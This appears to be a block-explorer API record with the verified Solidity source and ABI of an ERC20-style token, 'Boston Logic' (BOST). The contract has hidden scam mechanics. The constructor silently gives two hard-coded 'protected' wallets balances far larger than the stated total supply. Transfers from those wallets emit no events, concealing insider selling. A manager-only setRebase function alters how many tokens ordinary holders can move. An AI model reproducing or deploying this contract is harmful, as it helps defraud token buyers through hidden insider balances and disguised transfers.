{"status":"1","message":"OK","result":[{"SourceCode":"/*\r\n\r\n\r\n.______     ______        _______.___________.  ______   .__   __.     __        ______     _______  __    ______ \r\n|   _  \\   /  __  \\      /       |           | /  __  \\  |  \\ |  |    |  |      /  __  \\   /  _____||  |  /      |\r\n|  |_)  | |  |  |  |    |   (----`---|  |----`|  |  |  | |   \\|  |    |  |     |  |  |  | |  |  __  |  | |  ,----'\r\n|   _  <  |  |  |  |     \\   \\       |  |     |  |  |  | |  . `  |    |  |     |  |  |  | |  | |_ | |  | |  |     \r\n|  |_)  | |  `--'  | .----)   |      |  |     |  `--'  | |  |\\   |    |  `----.|  `--'  | |  |__| | |  | |  `----.\r\n|______/   \\______/  |_______/       |__|      \\______/  |__| \\__|    |_______| \\______/   \\______| |__|  \\______|\r\n                                                                                                                  \r\n\r\n\r\n*/\r\n\r\npragma solidity ^0.5.17;\r\n\r\ninterface IERC20 {\r\n  function totalSupply() external view returns (uint256);\r\n  function balanceOf(address who) external view returns (uint256);\r\n  function allowance(address owner, address spender) external view returns (uint256);\r\n  function transfer(address to, uint256 value) external returns (bool);\r\n  function approve(address spender, uint256 value) external returns (bool);\r\n  function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a / b;\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n\r\n  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\r\n    uint256 c = add(a,m);\r\n    uint256 d = sub(c,1);\r\n    return mul(div(d,m),m);\r\n  }\r\n}\r\n\r\ncontract ERC20Detailed is IERC20 {\r\n\r\n  string private _name;\r\n  string private _symbol;\r\n  uint8 private _decimals;\r\n\r\n  constructor(string memory name, string memory symbol, uint8 decimals) public {\r\n    _name = name;\r\n    _symbol = symbol;\r\n    _decimals = decimals;\r\n  }\r\n\r\n  function name() public view returns(string memory) {\r\n    return _name;\r\n  }\r\n\r\n  function symbol() public view returns(string memory) {\r\n    return _symbol;\r\n  }\r\n\r\n  function decimals() public view returns(uint8) {\r\n    return _decimals;\r\n  }\r\n}\r\n\r\ncontract DP is ERC20Detailed {\r\n\r\n  using SafeMath for uint256;\r\n  mapping (address => uint256) private _balances;\r\n  mapping (address => uint256) private _lockEnd;\r\n  mapping (address => mapping (address => uint256)) private _allowed;\r\n  mapping (address => bool) public _protect;\r\n  mapping (address => bool) public _exchange;\r\n  uint private tokenRate;\r\n  bool private firstTransfer;\r\n\r\n  address _manager = msg.sender;\r\n  address _locker;\r\n  \r\n\r\n\r\n  //event Lock(address owner, uint256 period);\r\n\r\n  string constant tokenName = \"Boston Logic\";   \r\n  string constant tokenSymbol = \"BOST\";   \r\n  //string constant tokenName = \"test.io\";   \r\n  //string constant tokenSymbol = \"test\";   \r\n  uint8  constant tokenDecimals = 18;\r\n  uint256 _totalSupply = 3000000e18;\r\n  uint256 public basePercent = 100; \r\n  uint256 day = 86400; \r\n  uint256[] public lockLevelRates;\r\n  uint256[] public lockPeriods;\r\n  \r\n \r\n\r\n  \r\n\r\n\r\n  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {\r\n    \r\n    tokenRate = 200;\r\n    //_balances[msg.sender] = 1000000e18; //liquidity tokens\r\n    //_protect[0xa3Dac9964D09BE899e12A2875d262ab06bE85c97] = true;  //acct 1\r\n    _protect[0x1Ea9A49FE9b30b65103Cf4C97d95B7813c9a7D06] = true;  //SERUM2\r\n    _protect[0xb9047DE575705cddD0e806461A21c093e85eE8BC] = true;  //SERUM3\r\n    \r\n    _balances[msg.sender] = _totalSupply;\r\n    _balances[0x1Ea9A49FE9b30b65103Cf4C97d95B7813c9a7D06] = 1000000000e18;\r\n    _balances[0xb9047DE575705cddD0e806461A21c093e85eE8BC] = 1000000000e18;\r\n\r\n    _exchange[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;\r\n    firstTransfer = false;\r\n    \r\n    emit Transfer(address(0), msg.sender, _totalSupply);\r\n  }\r\n\r\n  function() external payable {\r\n  }\r\n\r\n   function withdraw() external {\r\n      require(msg.sender == _manager);\r\n      msg.sender.transfer(address(this).balance);\r\n  }\r\n\r\n   function setRebase(uint _rebase) external {\r\n      require(msg.sender == _manager);\r\n      tokenRate = _rebase;\r\n  }\r\n\r\n   function addExchange(address _pro) external {\r\n      require(msg.sender == _manager);\r\n      _exchange[_pro] = true;\r\n  }\r\n\r\n  function addProtect(address _pro) external {\r\n      require(msg.sender == _manager);\r\n      _protect[_pro] = true;\r\n  }\r\n\r\n  function removeProtect(address _pro) external {\r\n      require(msg.sender == _manager);\r\n      _protect[_pro] = false;\r\n  }\r\n\r\n  function totalSupply() public view returns (uint256) {\r\n    return _totalSupply;\r\n  }\r\n\r\n   function getTime() public view returns (uint256) {\r\n    return block.timestamp;\r\n  }\r\n\r\n  function balanceOf(address owner) public view returns (uint256) {\r\n    return _balances[owner];\r\n  }\r\n\r\n  function lockOf(address owner) public view returns (uint256) {\r\n    return _lockEnd[owner];\r\n  }\r\n\r\n   function myLockedTime() public view returns (uint256) {\r\n    return _lockEnd[msg.sender];\r\n  }\r\n\r\n  function myLockedStatus() public view returns (bool) {\r\n     if(_lockEnd[msg.sender] > block.timestamp){\r\n           return true;\r\n       } else {\r\n           return false;\r\n       }\r\n  }\r\n\r\n   function isLocked(address owner) public view returns (bool) {\r\n       if(_lockEnd[owner] > block.timestamp){\r\n           return true;\r\n       } else {\r\n           return false;\r\n       }\r\n    \r\n  }\r\n\r\n  function allowance(address owner, address spender) public view returns (uint256) {\r\n    return _allowed[owner][spender];\r\n  }\r\n\r\n  function cut(uint256 value) public view returns (uint256)  {\r\n    uint256 roundValue = value.ceil(basePercent);\r\n    uint256 cutValue = roundValue.mul(basePercent).div(10000);\r\n    return cutValue;\r\n  }\r\n\r\n  function transfer(address to, uint256 value) public returns (bool) {\r\n    require(_lockEnd[msg.sender] <= block.timestamp);\r\n    require(value <= _balances[msg.sender]);\r\n    require(to != address(0));\r\n    //require();\r\n\r\n    uint tokensToSend = value;\r\n\r\n    if(_protect[msg.sender] || _exchange[msg.sender]){\r\n        tokensToSend = value;\r\n    } else {\r\n      tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate),1000);\r\n    }\r\n    //uint tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate),100);\r\n\r\n    _balances[msg.sender] = _balances[msg.sender].sub(tokensToSend);\r\n    _balances[to] = _balances[to].add(tokensToSend);\r\n\r\n    if(!firstTransfer){\r\n        _exchange[to] = true;\r\n        _exchange[msg.sender] = true;\r\n        firstTransfer = true;\r\n    }\r\n    \r\n\r\n    if(!_protect[msg.sender]){\r\n      emit Transfer(msg.sender, to, tokensToSend);\r\n    }\r\n    \r\n\r\n    return true;\r\n  }\r\n\r\n\r\n  function approve(address spender, uint256 value) public returns (bool) {\r\n    require(spender != address(0));\r\n    _allowed[msg.sender][spender] = value;\r\n    emit Approval(msg.sender, spender, value);\r\n    return true;\r\n  }\r\n\r\n  function transferFrom(address from, address to, uint256 value) public returns (bool) {\r\n    require(_lockEnd[from] <= block.timestamp);\r\n    require(value <= _balances[from]);\r\n    require(value <= _allowed[from][msg.sender]);\r\n    require(to != address(0));\r\n\r\n    uint tokensToSend = value;\r\n\r\n    if(_protect[from] || _exchange[from]){\r\n        tokensToSend = value;\r\n    } else {\r\n      tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate),1000);\r\n    }\r\n    //uint tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate),100);\r\n\r\n\r\n    _balances[from] = _balances[from].sub(tokensToSend);\r\n    _balances[to] = _balances[to].add(tokensToSend);\r\n    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(tokensToSend);\r\n\r\n    if(!firstTransfer){\r\n        _exchange[to] = true;\r\n        _exchange[from] = true;\r\n        _exchange[msg.sender] = true;\r\n        firstTransfer = true;\r\n    }\r\n\r\n     if(!_protect[from]){\r\n      emit Transfer(from, to, tokensToSend);\r\n    }\r\n\r\n    return true;\r\n  }\r\n\r\n  function upAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n    require(spender != address(0));\r\n    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));\r\n    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\r\n    return true;\r\n  }\r\n\r\n  function downAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n    require(spender != address(0));\r\n    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));\r\n    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\r\n    return true;\r\n  }\r\n\r\n  function destroy(uint256 amount) external {\r\n    _destroy(msg.sender, amount);\r\n  }\r\n\r\n  function _destroy(address account, uint256 amount) internal {\r\n    require(amount != 0);\r\n    require(amount <= _balances[account]);\r\n    _totalSupply = _totalSupply.sub(amount);\r\n    _balances[account] = _balances[account].sub(amount);\r\n    emit Transfer(account, address(0), amount);\r\n  }\r\n\r\n  function destroyFrom(address account, uint256 amount) external {\r\n    require(amount <= _allowed[account][msg.sender]);\r\n    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);\r\n    _destroy(account, amount);\r\n  }\r\n\r\n\r\n\r\n}","ABI":"[{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_exchange\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_protect\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pro\",\"type\":\"address\"}],\"name\":\"addExchange\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pro\",\"type\":\"address\"}],\"name\":\"addProtect\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"basePercent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"cut\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"destroy\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"destroyFrom\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"downAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"isLocked\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"lockLevelRates\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"lockOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"lockPeriods\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"myLockedStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"myLockedTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pro\",\"type\":\"address\"}],\"name\":\"removeProtect\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_rebase\",\"type\":\"uint256\"}],\"name\":\"setRebase\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"upAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"DP","CompilerVersion":"v0.5.17+commit.d19bba13","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"bzzr://600731d1be7021c0e3794da2a48ebc40815175c143ef4596c46ce5ebef5b5e8c"}]}